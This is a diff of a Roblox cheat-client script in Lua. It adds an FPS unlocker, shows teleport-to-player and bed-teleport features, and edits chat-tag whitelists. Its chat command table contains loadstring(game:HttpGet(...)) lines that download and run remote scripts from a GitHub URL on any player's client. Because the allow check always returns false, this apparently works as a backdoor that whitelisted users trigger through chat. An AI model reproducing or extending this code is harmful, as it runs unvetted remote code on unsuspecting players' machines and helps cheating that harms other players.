@@ -10407,6 +10407,17 @@ task.spawn(function()
 end)
 
 runFunction(function()
+	FPSUnlocker = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
+		Name = "FPSUnlocker",
+		Function = function(callback)
+			if callback then
+				setfpscap(99999999999999999999)
+			end
+		end
+	})
+end)
+
+runFunction(function()
 	local hasTeleported = false
 	local TweenService = game:GetService("TweenService")
 
@@ -10425,6 +10436,7 @@ runFunction(function()
 		end
 		return nearestPlayer
 	end
+
 
 	function tweenToNearestPlayer()
 		local nearestPlayer = findNearestPlayer()
@@ -10497,17 +10509,6 @@ runFunction(function()
 				BedTp["ToggleButton"](false)
 			end
 		end,
-	})
-end)
-
-runFunction(function()
-	FPSUnlocker = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
-		Name = "FPSUnlocker",
-		Function = function(callback)
-			if callback then
-				setfpscap(9999999999)
-			end
-		end
 	})
 end)
 
@@ -10598,7 +10599,7 @@ local commands = {
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/ProReleased/ProReleased/main/Rick"))()
 		end
 	end,
-	[".chip"] = function()
+	[".rick"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/ProReleased/ProReleased/main/Chip"))()
 		end
@@ -10627,6 +10628,7 @@ local commands = {
 		end
 	end
 }
+
 
 function isPlayerAllowed()
 	return false
@@ -10762,7 +10764,7 @@ txt.OnIncomingMessage = function(msg)
 				if v.id == userId then
 					if not hasTag then
 						hasTag = true
-						p.PrefixText = "<font color='"..colors["pink"].."'>[VAPE]</font> " .. msg.PrefixText
+						p.PrefixText = "<font color='"..colors["pink"].."'>[]</font> " .. msg.PrefixText
 					end
 					userType = 1
 				end
@@ -10774,9 +10776,21 @@ txt.OnIncomingMessage = function(msg)
 				if v.id == userId then
 					if not hasTag then
 						hasTag = true
-						p.PrefixText = "<font color='#33ccff'>[APE OWNER]</font> " .. msg.PrefixText
+						p.PrefixText = "<font color='#ff0000'>[APE OWNER]</font> " .. msg.PrefixText
 					end
 					userType = 3
+				end
+			end
+		end
+
+		if whitelist["Snoopy"] ~= nil then
+			for i, v in pairs(whitelist["Snoopy"]) do
+				if v.id == userId then
+					if not hasTag then
+						hasTag = true
+						p.PrefixText = "<font color='"..colors["pink"].."'>[]</font> " .. msg.PrefixText
+					end
+					userType = 2
 				end
 			end
 		end
